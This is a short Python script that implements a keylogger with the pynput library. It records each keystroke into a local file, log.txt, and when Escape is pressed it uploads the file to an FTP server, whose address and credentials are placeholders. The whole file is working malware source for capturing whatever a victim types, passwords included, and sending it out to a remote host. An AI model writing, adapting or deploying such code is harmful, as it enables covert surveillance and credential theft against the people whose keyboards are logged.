import pynput #pynput package
from pynput.keyboard import Key, Listener #keyboard is a sub module in pynput
from os.path import exists #path is a sub module in os 
from ftplib import FTP


 
def output_file(some_key):
    file_exists = exists("log.txt")
    if file_exists == True:
        with open("log.txt","a") as something:
            k = str(some_key).replace("'","")
            if k.find("space") > 0:
                something.write(" ")
            elif k.find("Key") == -1:
                something.write(str(k))           
    else:
     
        with open("log.txt","w") as something:
            k = str(some_key).replace("'","") #replace ' with empty character
            if k.find("space") > 0: #should there be a space key
                 something.write(" ") #replace it with an actual space
            elif k.find("Key") == -1: #Only write non-keys
                something.write(str(k))
                    



def pressed(key): #should a key be pressed trigger this function
    print("{0}".format(key))
    output_file(key)
    

def release(key):

    if key == Key.esc: #when escape is pressed terminate and upload the file
        with open("log.txt","rb") as something:
            ftp = FTP("your_ftp_server")
            ftp.login(user="your_ftp_username", passwd="your_ftp_password")
            ftp.storbinary(f'STOR ' + "log.txt",something)
            ftp.quit()
        return False
    
with Listener(on_press=pressed,on_release=release) as listener:
    listener.join() #Run's in a loop
    













